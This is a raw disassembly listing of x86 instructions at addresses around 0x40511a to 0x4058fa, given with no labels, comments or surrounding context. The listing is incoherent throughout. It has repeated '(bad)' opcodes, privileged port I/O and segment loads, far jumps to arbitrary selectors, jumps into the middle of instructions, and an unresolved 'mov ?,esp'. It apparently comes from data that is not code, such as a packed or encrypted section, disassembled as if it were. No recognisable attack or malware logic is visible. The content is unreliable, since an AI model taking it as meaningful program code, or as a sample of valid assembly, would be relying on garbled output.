  40511a:	call   0xd1bc63e1
  40511f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405120:	(bad)  
  405121:	jnp    0x4050be
  405123:	push   ebp
  405124:	push   edi
  405125:	mov    ds:0xd49cd2b1,al
  40512a:	mov    ds:0x781f65e9,al
  40512f:	push   eax
  405130:	leave  
  405131:	mov    cl,0x51
  405133:	add    cl,0xec
  405136:	push   ebp
  405137:	dec    ebp
  405138:	mov    cl,0x6d
  40513a:	je     0x405170
  40513c:	cmp    DWORD PTR [edx+0x41],esp
  40513f:	sub    eax,0x3fa5ee98
  405144:	jmp    0x4051a0
  405146:	dec    ecx
  405147:	mov    ebp,ecx
  405149:	dec    eax
  40514a:	pop    ecx
  40514b:	dec    edi
  40514c:	dec    ebp
  40514d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40514e:	arpl   WORD PTR [edx],bx
  405150:	pop    esp
  405151:	ror    esi,cl
  405153:	je     0x40515a
  405155:	outs   dx,DWORD PTR ds:[esi]
  405156:	(bad)  
  405157:	mov    ds:0x610c60d0,al
  40515c:	push   eax
  40515d:	pop    ebp
  40515e:	sbb    bh,BYTE PTR [esi+0x7f6df00d]
  405164:	les    ebp,FWORD PTR [eax+0x2]
  405167:	mov    ebp,0xbc4f78b8
  40516c:	jns    0x405132
  40516e:	imul   DWORD PTR [edx+0x77]
  405171:	jbe    0x40519f
  405173:	xor    DWORD PTR [esp+ebp*4],edi
  405176:	in     al,dx
  405177:	mov    ss,WORD PTR [eax+0x9]
  40517a:	daa    
  40517b:	stos   DWORD PTR es:[edi],eax
  40517c:	out    dx,al
  40517d:	xchg   ebp,eax
  40517e:	daa    
  40517f:	mov    eax,0xac1e8dc8
  405184:	pop    edi
  405185:	inc    esp
  405186:	je     0x4051ed
  405188:	nop
  405189:	push   edi
  40518a:	mov    cl,BYTE PTR gs:[esi-0xb67f368]
  405191:	ins    DWORD PTR es:[edi],dx
  405192:	loopne 0x40513e
  405194:	cmc    
  405195:	sbb    eax,0x2a19fe1f
  40519a:	mul    esi
  40519c:	push   edi
  40519d:	sub    eax,0x6393d053
  4051a2:	pop    ds
  4051a3:	cld    
  4051a4:	(bad)  
  4051a5:	icebp  
  4051a6:	xchg   ebp,eax
  4051a7:	xor    DWORD PTR ds:0xa9311166,0xa1f1e5c9
  4051b1:	pop    ds
  4051b2:	and    eax,0xd49736fd
  4051b7:	call   esi
  4051b9:	add    DWORD PTR [esi],esp
  4051bb:	inc    edx
  4051bc:	es dec ebx
  4051be:	adc    eax,0x651f2901
  4051c3:	loopne 0x405159
  4051c5:	adc    dl,BYTE PTR [ebx-0x4]
  4051c8:	jmp    FWORD PTR [ebp+0x4f]
  4051cb:	enter  0x4cdc,0xb3
  4051cf:	push   ebx
  4051d0:	js     0x405174
  4051d2:	jmp    0x4051fc
  4051d4:	daa    
  4051d5:	out    dx,eax
  4051d6:	bound  ebp,QWORD PTR [eax-0x588d73ac]
  4051dc:	xor    eax,ecx
  4051de:	inc    edi
  4051df:	sbb    bh,BYTE PTR [ebx-0x1723c668]
  4051e5:	sbb    esp,ebp
  4051e7:	mov    ds,WORD PTR [eax]
  4051e9:	lock imul esp,DWORD PTR [ecx-0x19dc23c],0xffffffae
  4051f1:	movlps xmm7,QWORD PTR [ebp+0x3da83c4d]
  4051f8:	pop    esi
  4051f9:	mov    bh,0xfc
  4051fb:	xor    al,0xad
  4051fd:	pushf  
  4051fe:	mov    bl,0x54
  405200:	push   edi
  405201:	adc    al,0x1b
  405203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405204:	pop    ebx
  405205:	lock mov al,0xf7
  405208:	pop    esp
  405209:	mov    bl,0x28
  40520b:	and    al,0x29
  40520d:	xchg   esp,eax
  40520e:	or     eax,0xcdfa2ed7
  405213:	(bad)  
  405214:	mov    esp,0x7a56d83f
  405219:	push   ebx
  40521a:	ror    DWORD PTR [edi],cl
  40521c:	call   0x494e5670
  405221:	push   eax
  405222:	scas   eax,DWORD PTR es:[edi]
  405223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405224:	out    dx,al
  405225:	(bad)
  405228:	dec    esi
  405229:	xor    cl,ch
  40522b:	push   0xffffffbe
  40522d:	cwde   
  40522e:	out    0x6d,eax
  405230:	mov    eax,ds:0x2f9cc4d1
  405235:	inc    ebp
  405236:	enter  0x69b3,0xae
  40523a:	mov    al,0xda
  40523c:	jp     0x405204
  40523e:	mov    ch,0xde
  405240:	imul   esi,edi,0x1400e925
  405246:	cmp    eax,0x99b6e59c
  40524b:	lock add esp,0xffffffa1
  40524f:	mov    ecx,0x73083968
  405254:	mov    ds:0xda198001,eax
  405259:	lods   al,BYTE PTR ds:[esi]
  40525a:	push   DWORD PTR [ecx]
  40525c:	lds    edx,FWORD PTR [edx]
  40525e:	sar    DWORD PTR [ecx],cl
  405260:	data16 jl 0x40526b
  405263:	mov    esi,0x163153dc
  405268:	jmp    esp
  40526a:	dec    ecx
  40526b:	into   
  40526c:	(bad)  
  40526d:	push   eax
  40526e:	dec    ebp
  40526f:	(bad)  
  405270:	out    0x78,al
  405272:	js     0x40523b
  405274:	xchg   esi,eax
  405275:	inc    ebp
  405276:	into   
  405277:	stos   DWORD PTR es:[edi],eax
  405278:	dec    edx
  405279:	scas   eax,DWORD PTR es:[edi]
  40527a:	sbb    bl,bh
  40527c:	scas   eax,DWORD PTR es:[edi]
  40527d:	dec    ebp
  40527e:	int    0xfe
  405280:	bound  esp,QWORD PTR [ecx]
  405282:	push   ecx
  405283:	jnp    0x405255
  405285:	pop    esp
  405286:	and    al,0xb7
  405288:	sbb    cl,BYTE PTR [edi]
  40528a:	or     eax,0xb09e5c2f
  40528f:	add    edx,DWORD PTR [edx+0x28]
  405292:	call   0x35aca7e7
  405297:	mov    BYTE PTR [ecx+edx*1+0x36],ch
  40529b:	aad    0xd6
  40529d:	je     0x40524b
  40529f:	jecxz  0x40524b
  4052a1:	pop    eax
  4052a2:	push   0x93594c91
  4052a7:	in     eax,0x4a
  4052a9:	subps  xmm3,xmm7
  4052ac:	push   0x6519019d
  4052b1:	mov    al,ds:0xbe95436b
  4052b6:	mov    edi,0x277421fd
  4052bb:	das    
  4052bc:	out    0xc0,eax
  4052be:	xor    al,0x12
  4052c0:	ficom  DWORD PTR [esp+eiz*8]
  4052c3:	lahf   
  4052c4:	fild   DWORD PTR [eax]
  4052c6:	jmp    0x405257
  4052c8:	dec    BYTE PTR [eax]
  4052ca:	push   ecx
  4052cb:	pop    ebp
  4052cc:	sbb    eax,0x7c5a24ee
  4052d1:	xor    ebx,DWORD PTR [edi-0x80]
  4052d4:	std    
  4052d5:	inc    edi
  4052d6:	jle    0x40532b
  4052d8:	sbb    dh,dh
  4052da:	push   ebx
  4052db:	(bad)  
  4052dc:	outs   dx,BYTE PTR ds:[esi]
  4052dd:	mov    dl,0xd0
  4052df:	stc    
  4052e0:	sbb    al,0x39
  4052e2:	xor    dl,BYTE PTR [ebp+0x30]
  4052e5:	cmp    ebx,DWORD PTR [edi]
  4052e7:	sbb    DWORD PTR [ecx-0x70],0xffffff99
  4052eb:	adc    ecx,edi
  4052ed:	scas   al,BYTE PTR es:[edi]
  4052ee:	or     BYTE PTR [ecx+0x252d53ac],dh
  4052f4:	popf   
  4052f5:	test   dh,ch
  4052f7:	in     al,dx
  4052f8:	cwde   
  4052f9:	ror    DWORD PTR [ecx-0x6f],1
  4052fc:	rcl    BYTE PTR [eax-0x2f5448a3],1
  405302:	push   edi
  405303:	(bad)  
  405304:	popf   
  405305:	call   0x732bff7c
  40530a:	cdq    
  40530b:	test   al,0x49
  40530d:	(bad)  
  40530e:	mov    edi,DWORD PTR [edx-0x68]
  405311:	inc    edi
  405312:	push   ecx
  405313:	sbb    edi,DWORD PTR [edx]
  405315:	inc    ebp
  405316:	ss mov dh,0x98
  405319:	push   esp
  40531a:	sbb    dl,0xa6
  40531d:	dec    edx
  40531e:	(bad)  
  40531f:	ror    DWORD PTR [ebx+0x75],1
  405322:	fs int3 
  405324:	cwde   
  405325:	mov    DWORD PTR [ecx-0x7f98ccf1],0xc049204d
  40532f:	xchg   esi,eax
  405330:	repnz pop ss
  405332:	push   eax
  405333:	add    eax,0xd57c7e43
  405338:	loopne 0x405325
  40533a:	mov    ds:0xefbcc8d7,eax
  40533f:	dec    esi
  405340:	stos   BYTE PTR es:[edi],al
  405341:	out    0xd,al
  405343:	jmp    0x87bb5e37
  405348:	stos   BYTE PTR es:[edi],al
  405349:	sub    ebx,DWORD PTR [edx+0x70]
  40534c:	and    al,0xba
  40534e:	ja     0x40533f
  405350:	pop    esi
  405351:	mov    esp,DWORD PTR [ebp-0x6fc4cfe7]
  405357:	in     eax,0xe9
  405359:	mov    cl,0x7a
  40535b:	push   ds
  40535c:	loopne 0x405391
  40535e:	retf   0x8265
  405361:	adc    al,bl
  405363:	mov    ebx,0xe711ef3
  405368:	mov    ecx,0x1006421d
  40536d:	cmp    BYTE PTR [ebp+0x1a],bl
  405370:	or     BYTE PTR [ecx-0x6c7529c6],0x53
  405377:	repnz mov cl,BYTE PTR es:[ebx]
  40537b:	cdq    
  40537c:	sub    DWORD PTR [ebx+0x3a49f763],esi
  405382:	sub    BYTE PTR [ebx-0x2356f7ee],dh
  405388:	shr    edx,0xa9
  40538b:	mov    ah,dl
  40538d:	push   cs
  40538e:	push   ebp
  40538f:	mov    ebp,0x998981d5
  405394:	(bad)  
  405395:	es jl  0x40532e
  405398:	bnd jg 0x4053da
  40539b:	repz clc 
  40539d:	rcl    edi,0xf4
  4053a0:	addr16 retf 
  4053a2:	push   edx
  4053a3:	jno    0x40541e
  4053a5:	push   es
  4053a6:	jge    0x40535f
  4053a8:	push   es
  4053a9:	jbe    0x405371
  4053ab:	bnd ret 0x13de
  4053af:	aaa    
  4053b0:	add    DWORD PTR [ecx],ebx
  4053b2:	cmp    ah,0x54
  4053b5:	dec    ebp
  4053b6:	idiv   DWORD PTR [edi+0x4ce58412]
  4053bc:	test   eax,0x9afba24c
  4053c1:	jl     0x4053ee
  4053c3:	sbb    ch,0x88
  4053c6:	lds    esi,FWORD PTR [edi]
  4053c8:	jb     0x4053c2
  4053ca:	push   esi
  4053cb:	xchg   ecx,eax
  4053cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053cd:	cmp    eax,0x52d62068
  4053d2:	and    BYTE PTR [ebp+0x16],cl
  4053d5:	sbb    bl,bl
  4053d7:	stos   DWORD PTR es:[edi],eax
  4053d8:	cs pop ebx
  4053da:	bswap  esi
  4053dc:	xor    BYTE PTR [edx-0x65],dl
  4053df:	pop    ebp
  4053e0:	sub    DWORD PTR [esi+edx*8+0x3e],ecx
  4053e4:	stc    
  4053e5:	leave  
  4053e6:	xor    al,0xd7
  4053e8:	mov    esi,0xd0ec9ee9
  4053ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053ee:	les    eax,FWORD PTR [esi-0x5d624e5d]
  4053f4:	xchg   ecx,eax
  4053f5:	mov    dh,0x88
  4053f7:	fisub  DWORD PTR [esi+0x32]
  4053fa:	lock mov al,ds:0x83d8497b
  405400:	int    0x62
  405402:	jno    0x405473
  405404:	cmp    ah,dh
  405406:	out    0xdd,al
  405408:	pushf  
  405409:	mov    ebp,0x5624da3d
  40540e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40540f:	cli    
  405410:	jl     0x405481
  405412:	ins    BYTE PTR es:[edi],dx
  405413:	add    al,0x18
  405415:	cdq    
  405416:	mov    ebx,0xcbb02733
  40541b:	mov    ?,esp
  40541d:	adc    edi,DWORD PTR [esi]
  40541f:	popf   
  405420:	dec    ecx
  405421:	or     al,0xfb
  405423:	je     0x405475
  405425:	mov    esp,0xea8299e2
  40542a:	xchg   BYTE PTR [ebx],bh
  40542c:	ret    0x6332
  40542f:	scas   eax,DWORD PTR es:[edi]
  405430:	mov    al,ds:0xc39c1d44
  405435:	outs   dx,DWORD PTR ds:[esi]
  405436:	cli    
  405437:	repnz sub bh,BYTE PTR [esi]
  40543a:	xlat   BYTE PTR ds:[ebx]
  40543b:	shr    BYTE PTR [ebp-0x53],0x34
  40543f:	scas   al,BYTE PTR es:[edi]
  405440:	loope  0x4053cd
  405442:	xor    eax,0x8390f7eb
  405447:	fisttp QWORD PTR [ebp+0x49c11730]
  40544d:	aad    0xcd
  40544f:	inc    edi
  405450:	pop    ecx
  405451:	lea    ecx,[edi+0x68c198f2]
  405457:	mov    es,WORD PTR [ebp+ebp*4+0x1d7198ea]
  40545e:	pop    ebp
  40545f:	(bad)  
  405461:	out    dx,eax
  405462:	mov    eax,0xbcfaaa65
  405467:	mov    ebx,0x7955a18
  40546c:	push   edx
  40546d:	sub    DWORD PTR [esi],ebp
  40546f:	adc    eax,0x1e5c9378
  405474:	jb     0x405443
  405476:	sbb    dh,BYTE PTR [ebx+0x2c8c585e]
  40547c:	gs cli 
  40547e:	xor    eax,ebp
  405480:	fst    st(3)
  405482:	mov    bh,0x76
  405484:	ret    0x36a3
  405487:	sub    DWORD PTR [eax+0x6],ecx
  40548a:	pop    esp
  40548b:	fcom   QWORD PTR [ecx]
  40548d:	sahf   
  40548e:	call   DWORD PTR [eax+0x55]
  405491:	stc    
  405492:	cmp    cl,0xbc
  405495:	and    DWORD PTR [edi],eax
  405497:	xchg   DWORD PTR [ecx],ebp
  405499:	cmc    
  40549a:	adc    al,0x44
  40549c:	or     ebx,0x8f7ee88
  4054a2:	mov    eax,ds:0x9efcfc06
  4054a7:	sti    
  4054a8:	push   es
  4054a9:	sti    
  4054aa:	mov    cl,BYTE PTR [ecx+ecx*2]
  4054ad:	loopne 0x405498
  4054af:	std    
  4054b0:	fild   QWORD PTR ds:0x6c1ef651
  4054b6:	(bad)  
  4054b8:	cwde   
  4054b9:	sbb    al,dh
  4054bb:	add    DWORD PTR [ecx+eax*4-0x60293565],eax
  4054c2:	test   BYTE PTR fs:[ebx],al
  4054c5:	call   0x9bc8:0x4b653954
  4054cc:	pop    ss
  4054cd:	fsubr  QWORD PTR [edi]
  4054cf:	scas   al,BYTE PTR es:[edi]
  4054d0:	sub    ch,BYTE PTR [edi+0x3dcb4a7b]
  4054d6:	stc    
  4054d7:	cs aad 0xb8
  4054da:	adc    BYTE PTR [edx-0x4b3fd03f],al
  4054e0:	xor    eax,0x561833f1
  4054e5:	inc    eax
  4054e6:	in     eax,0x3f
  4054e8:	(bad)  
  4054e9:	pop    edi
  4054ea:	popf   
  4054eb:	pop    ecx
  4054ec:	mov    al,ds:0x396b33b8
  4054f1:	or     DWORD PTR [eax+0x75],esp
  4054f4:	iret   
  4054f5:	daa    
  4054f6:	push   edi
  4054f7:	jne    0x4054ca
  4054f9:	in     al,dx
  4054fa:	add    ebp,DWORD PTR [ebx-0x70]
  4054fd:	mov    esi,0x405b8991
  405502:	xor    BYTE PTR [esi],dl
  405504:	pop    edx
  405505:	mov    esi,0xcb784a54
  40550a:	inc    ebp
  40550b:	or     dl,BYTE PTR [edx-0x27]
  40550e:	fist   WORD PTR ds:0x5468dd97
  405514:	not    BYTE PTR [eax]
  405516:	in     al,dx
  405517:	push   eax
  405518:	shl    eax,1
  40551a:	xchg   esp,eax
  40551b:	scas   al,BYTE PTR es:[edi]
  40551c:	mov    cl,0x6a
  40551e:	scas   al,BYTE PTR es:[edi]
  40551f:	add    bh,BYTE PTR [ebx+0x8120825]
  405525:	cmp    al,0x53
  405527:	fcomp  DWORD PTR [esi+0x56]
  40552a:	and    al,0x3f
  40552c:	inc    ebx
  40552d:	or     bh,BYTE PTR [ebp+ebp*8-0x311b4170]
  405534:	pop    ds
  405535:	push   edx
  405536:	into   
  405537:	cs inc edx
  405539:	lock imul esp,esp,0x12
  40553d:	or     eax,0x50510512
  405542:	cmp    eax,0xf0695584
  405547:	add    dl,ch
  405549:	add    esp,DWORD PTR [edx-0x7e]
  40554c:	loope  0x4055ac
  40554e:	hlt    
  40554f:	jge    0x40554c
  405551:	xchg   BYTE PTR ds:0xcbe798f8,ah
  405557:	fsubr  QWORD PTR [ebp+0x76240dea]
  40555d:	clc    
  40555e:	mov    ebx,0x4b77a5a0
  405563:	mov    bl,0xbb
  405565:	rol    BYTE PTR [ebx+0x1e146088],cl
  40556b:	inc    eax
  40556c:	fistp  QWORD PTR [ebx]
  40556e:	pop    DWORD PTR [edx+0x8e603e6]
  405574:	rol    DWORD PTR [ecx+0x54765174],1
  40557a:	data16 out 0xef,al
  40557d:	rol    esi,1
  40557f:	mov    eax,ds:0xbc4b8a4b
  405584:	dec    esp
  405585:	mov    al,ds:0x8991697
  40558a:	repz cmp BYTE PTR [edi],0x1c
  40558e:	imul   ebx
  405590:	loope  0x405557
  405592:	test   eax,0xae7e77dd
  405597:	sahf   
  405598:	iret   
  405599:	mov    al,0xbf
  40559b:	ret    0xdfa
  40559e:	cdq    
  40559f:	test   eax,0xb81e77ad
  4055a4:	ja     0x4055a4
  4055a6:	or     BYTE PTR [edi-0x698be758],ch
  4055ac:	dec    edi
  4055ad:	loopne 0x4055df
  4055af:	hlt    
  4055b0:	imul   esp,ebp,0x9c5947a1
  4055b6:	test   ah,ch
  4055b8:	cs ds xor edx,ecx
  4055bc:	ins    BYTE PTR es:[edi],dx
  4055bd:	cdq    
  4055be:	adc    al,0xc3
  4055c0:	xchg   ah,ah
  4055c2:	and    al,0x66
  4055c4:	dec    ebx
  4055c5:	das    
  4055c6:	adc    ebx,DWORD PTR [ebx+0x17]
  4055c9:	mov    bh,0xb
  4055cb:	xor    ah,bh
  4055cd:	in     al,dx
  4055ce:	enter  0x31bc,0x15
  4055d2:	leave  
  4055d3:	scas   eax,DWORD PTR es:[edi]
  4055d4:	ja     0x4055ad
  4055d6:	pop    ebx
  4055d7:	mov    cl,0xf8
  4055d9:	aad    0x83
  4055db:	mov    al,BYTE PTR [ecx+eiz*1+0x2f]
  4055df:	add    eax,0x76d698db
  4055e4:	sub    al,BYTE PTR [ebp+0x61]
  4055e7:	sub    esp,DWORD PTR [edi+0x3d83fe25]
  4055ed:	and    DWORD PTR [eax-0x1d36d698],ebx
  4055f3:	je     0x405577
  4055f5:	sbb    al,0x36
  4055f7:	jb     0x4055ec
  4055f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055fa:	call   0xbc801f3c
  4055ff:	mov    eax,0xdeb886d7
  405604:	je     0x405622
  405606:	inc    esp
  405607:	or     dl,BYTE PTR [ecx]
  405609:	test   eax,0xf59cdc53
  40560e:	cmc    
  40560f:	nop
  405610:	add    ebx,DWORD PTR [ebx]
  405612:	pushf  
  405613:	jb     0x4055d9
  405615:	in     eax,0x54
  405617:	inc    esi
  405618:	cmp    DWORD PTR [edi+eax*8],esi
  40561b:	mov    al,0x1a
  40561d:	mov    al,ds:0x39b513ae
  405622:	je     0x405612
  405624:	ins    BYTE PTR es:[edi],dx
  405625:	test   eax,0xca3d7013
  40562a:	(bad)  
  40562b:	repz pop ebx
  40562d:	cmc    
  40562e:	cmp    eax,0x5cb8cd41
  405633:	aas    
  405634:	aaa    
  405635:	ins    BYTE PTR es:[edi],dx
  405636:	scas   eax,DWORD PTR es:[edi]
  405637:	adc    edx,DWORD PTR [edx-0x779029c4]
  40563d:	and    eax,DWORD PTR [eax+0x2f]
  405640:	aas    
  405641:	ins    BYTE PTR es:[edi],dx
  405642:	out    0xfa,al
  405644:	pop    esp
  405645:	mov    bh,0xf1
  405647:	sub    dh,BYTE PTR [edx]
  405649:	inc    ebx
  40564a:	in     al,dx
  40564b:	pop    esi
  40564c:	push   ecx
  40564d:	push   ecx
  40564e:	sbb    DWORD PTR ds:0x6e8896e3,edx
  405654:	aaa    
  405655:	cli    
  405656:	ss fdivrp st(7),st
  405659:	icebp  
  40565a:	xchg   edi,eax
  40565b:	and    eax,0x18c4270c
  405660:	shr    eax,1
  405662:	inc    esp
  405663:	cmp    DWORD PTR [edi],ecx
  405665:	or     BYTE PTR [ebp+0x54],al
  405668:	jno    0x405611
  40566a:	fisttp DWORD PTR [ebx]
  40566c:	jmp    0x103e:0x46061ea4
  405673:	(bad)  
  405674:	mov    edx,0x40c08215
  405679:	fiadd  WORD PTR [eax]
  40567b:	mov    ds:0x45dc6f66,eax
  405680:	jae    0x40566b
  405682:	ror    edx,1
  405684:	push   edi
  405685:	push   eax
  405686:	ds (bad) 
  405688:	outs   dx,DWORD PTR ds:[esi]
  405689:	fimul  WORD PTR [eax-0x41b1858a]
  40568f:	retf   
  405690:	ins    DWORD PTR es:[edi],dx
  405691:	(bad)  [edi]
  405693:	sub    eax,0xc164d2bd
  405698:	cmp    DWORD PTR [edi-0x56c1dc7a],esi
  40569e:	xchg   DWORD PTR [edx+0x3a],ebx
  4056a1:	mov    WORD PTR [edi-0x13cc9ef6],ds
  4056a7:	lock sar BYTE PTR [esi-0x22],1
  4056ab:	imul   esp,DWORD PTR [ebx+0x3a],0xccb33973
  4056b2:	mov    WORD PTR [ebx],fs
  4056b4:	ds adc al,0x67
  4056b7:	nop
  4056b8:	mov    edi,0x10f21671
  4056bd:	fs mov bh,0x43
  4056c0:	sbb    eax,0x6472eaa7
  4056c5:	mov    dh,0x8
  4056c7:	adc    al,dh
  4056c9:	or     edi,DWORD PTR [ebx+0x22cc8147]
  4056cf:	arpl   si,di
  4056d1:	daa    
  4056d2:	add    ah,BYTE PTR [edx-0x3]
  4056d5:	hlt    
  4056d6:	addr16 dec esp
  4056d8:	dec    ecx
  4056d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056da:	jo     0x405744
  4056dc:	ja     0x4056e7
  4056de:	fsubp  st(0),st
  4056e0:	mov    al,ds:0x5f5d1937
  4056e5:	scas   al,BYTE PTR es:[edi]
  4056e6:	jmp    0x4056e6
  4056e8:	and    dl,BYTE PTR [ecx-0x1729fb3]
  4056ee:	dec    eax
  4056ef:	xchg   esi,ebx
  4056f1:	aas    
  4056f2:	cmp    eax,DWORD PTR [ecx+0x1ce7297c]
  4056f8:	dec    ecx
  4056f9:	push   0xffffff8b
  4056fb:	mov    ds:0xdad1b116,al
  405700:	jo     0x4056d7
  405702:	jp     0x405768
  405704:	inc    edx
  405705:	cmp    eax,0x92e1fb7c
  40570a:	jo     0x405768
  40570c:	(bad)  
  40570d:	repz retf 
  40570f:	inc    ecx
  405710:	pushf  
  405711:	sub    al,0x7b
  405713:	clc    
  405714:	sub    bl,BYTE PTR ds:0x42cc970f
  40571a:	mov    ds:0x1e077a19,eax
  40571f:	and    ah,dl
  405721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405722:	push   ebp
  405723:	jmp    0xf278:0x9cdd59
  40572a:	mov    esp,DWORD PTR [edx]
  40572c:	inc    ecx
  40572d:	psubusw mm6,QWORD PTR [esi]
  405730:	cmp    ch,bl
  405732:	(bad)  
  405733:	in     al,dx
  405734:	repnz push ebx
  405736:	ja     0x4056e2
  405738:	adc    al,0x13
  40573a:	and    ebx,edx
  40573c:	sub    DWORD PTR [ebx-0x3e],esi
  40573f:	repnz out 0x5c,eax
  405742:	(bad)  
  405743:	gs lock retf 0xe6f4
  405748:	fwait
  405749:	gs mov edi,0xdeaeb51f
  40574f:	std    
  405750:	lea    edi,[ecx+edi*8+0x14]
  405754:	(bad)  
  405755:	retf   
  405756:	mov    ds:0x87892087,eax
  40575b:	and    eax,0xf698d04
  405760:	mov    edx,0x501b9122
  405765:	xor    esi,DWORD PTR [ecx-0x59fab702]
  40576b:	cli    
  40576c:	push   esp
  40576d:	outs   dx,DWORD PTR ds:[esi]
  40576e:	cmp    esi,DWORD PTR [eax]
  405770:	sub    al,0xb8
  405772:	loop   0x4057c4
  405774:	cwde   
  405775:	fstp   DWORD PTR [eax]
  405777:	loopne 0x40570e
  405779:	stc    
  40577a:	xchg   bh,ah
  40577c:	mov    esp,DWORD PTR [edi]
  40577e:	push   esp
  40577f:	pushf  
  405780:	bound  ecx,QWORD PTR [ecx+0x487eac65]
  405786:	xchg   ecx,eax
  405787:	push   esi
  405788:	mov    bl,0x7d
  40578a:	or     eax,0x3a93252a
  40578f:	adc    DWORD PTR [eax],0x867f414c
  405795:	stc    
  405796:	mov    esi,0x8216fe76
  40579b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40579c:	or     DWORD PTR [ebx+0xb],esi
  40579f:	enter  0x6f6a,0xc2
  4057a3:	cmp    BYTE PTR [edx+0x2aa5f7f4],al
  4057a9:	addr16 jno 0x405737
  4057ac:	scas   al,BYTE PTR es:[edi]
  4057ad:	or     DWORD PTR [ebx-0x5e],eax
  4057b0:	jns    0x405737
  4057b2:	add    bh,al
  4057b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057b5:	(bad)  
  4057b6:	int3   
  4057b7:	sub    al,0x64
  4057b9:	or     edi,DWORD PTR [ecx+0x304d6604]
  4057bf:	repnz pop edx
  4057c1:	add    BYTE PTR [bx+si+0x6d],bh
  4057c5:	lods   al,BYTE PTR ds:[esi]
  4057c6:	mul    BYTE PTR [edx]
  4057c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c9:	shl    BYTE PTR [esi+0x22],cl
  4057cc:	shl    BYTE PTR [edx-0x231bfe27],cl
  4057d2:	mov    ds:0x8aac48e7,al
  4057d7:	ds aam 0x3c
  4057da:	addr16 mov eax,0xa4a30920
  4057e0:	adc    DWORD PTR [ebx-0x49b6c682],esi
  4057e6:	pop    ecx
  4057e7:	loopne 0x4057af
  4057e9:	xor    bh,BYTE PTR ds:0x46ddfe2b
  4057ef:	cmp    DWORD PTR [ecx-0x50],0x235bc831
  4057f6:	xor    DWORD PTR [ebx],ecx
  4057f8:	add    edi,DWORD PTR [eax]
  4057fa:	loopne 0x405843
  4057fc:	cmp    DWORD PTR [eax+esi*4-0x7d],esp
  405800:	jl     0x40578e
  405802:	inc    edi
  405803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405804:	stc    
  405805:	rcr    DWORD PTR [ebx-0x6a],1
  405808:	rol    BYTE PTR es:[edi-0x25],cl
  40580c:	xor    DWORD PTR [ebx+0x4b4d961d],edx
  405812:	scas   eax,DWORD PTR es:[edi]
  405813:	xchg   ecx,eax
  405814:	stos   DWORD PTR es:[edi],eax
  405815:	xchg   ebx,eax
  405816:	(bad)  
  405817:	adc    BYTE PTR [eax-0x5a],bl
  40581a:	push   es
  40581b:	push   0xffffffba
  40581d:	imul   esp,DWORD PTR [edi+ebp*8+0x31],0xd47e65f0
  405825:	out    0xd,eax
  405827:	fisttp WORD PTR [eax+ebx*2]
  40582a:	sub    eax,edx
  40582c:	lods   al,BYTE PTR ds:[esi]
  40582d:	or     esp,DWORD PTR [ebp+0x501eb258]
  405833:	je     0x40581e
  405835:	push   es
  405836:	mov    DWORD PTR [edx+0x51],esp
  405839:	pusha  
  40583a:	mov    esp,0x6e1c63f7
  40583f:	or     ebp,0x5bd13af5
  405845:	les    edi,FWORD PTR [ebx+0x562b7720]
  40584b:	clc    
  40584c:	mov    esi,0x589f39b5
  405851:	loop   0x405800
  405853:	mov    esp,0xad11cf6
  405858:	mov    eax,ds:0xd219537b
  40585d:	inc    eax
  40585e:	jo     0x40580b
  405860:	or     ecx,DWORD PTR [edx+eax*8]
  405863:	mov    esp,0x5915eb36
  405868:	sbb    BYTE PTR [ebp+0x3f],dl
  40586b:	push   ebx
  40586c:	inc    eax
  40586d:	add    edx,DWORD PTR [ebp+0x3b]
  405870:	adc    eax,0xf7c1670e
  405875:	push   eax
  405876:	lock mov ah,0xd0
  405879:	fld    TBYTE PTR [edi+0x21]
  40587c:	loop   0x40581b
  40587e:	in     eax,0xda
  405880:	(bad)  
  405881:	mov    ebp,0x47759f85
  405886:	dec    ebp
  405887:	call   0xc5ba0ebf
  40588c:	push   ebp
  40588d:	jbe    0x405826
  40588f:	sub    eax,0x6b747a3b
  405894:	jecxz  0x4058cf
  405896:	jo     0x405858
  405898:	jmp    0x4058fc
  40589a:	ins    DWORD PTR es:[edi],dx
  40589b:	(bad)  
  40589c:	cli    
  40589d:	fsub   DWORD PTR [ebx-0x14]
  4058a0:	mov    cl,0xc0
  4058a2:	lods   al,BYTE PTR ds:[esi]
  4058a3:	mov    bh,0xc3
  4058a5:	pop    ss
  4058a6:	cmc    
  4058a7:	mov    dh,ah
  4058a9:	or     bh,bh
  4058ab:	push   edi
  4058ac:	popf   
  4058ad:	dec    ebx
  4058ae:	dec    ebx
  4058af:	in     al,dx
  4058b0:	push   cs
  4058b1:	mov    dl,0x9b
  4058b3:	cmp    ebp,eax
  4058b5:	xchg   edi,eax
  4058b6:	(bad)  
  4058b7:	retf   0x5a3b
  4058ba:	mov    DWORD PTR [bp+si+0x1fa6],edi
  4058bf:	stos   BYTE PTR es:[edi],al
  4058c0:	icebp  
  4058c1:	pop    ebx
  4058c2:	adc    eax,0xaed1c88a
  4058c7:	popa   
  4058c8:	imul   eax
  4058ca:	add    al,0x93
  4058cc:	jbe    0x40594c
  4058ce:	cli    
  4058cf:	and    al,0x97
  4058d1:	dec    eax
  4058d2:	jns    0x405947
  4058d4:	fistp  DWORD PTR [edi]
  4058d6:	dec    edx
  4058d7:	sub    cl,bh
  4058d9:	test   al,0x11
  4058db:	out    0x84,eax
  4058dd:	mov    ah,0x3b
  4058df:	icebp  
  4058e0:	push   ss
  4058e1:	dec    ebx
  4058e2:	out    dx,eax
  4058e3:	adc    DWORD PTR [esi-0x73736b79],edx
  4058e9:	push   ebp
  4058ea:	xchg   ecx,eax
  4058eb:	fcom   DWORD PTR [edi]
  4058ed:	dec    esi
  4058ee:	mov    eax,ds:0xbfec8974
  4058f3:	mov    esp,DWORD PTR [eax+eiz*4-0x30cef256]
  4058fa:	(bad)  
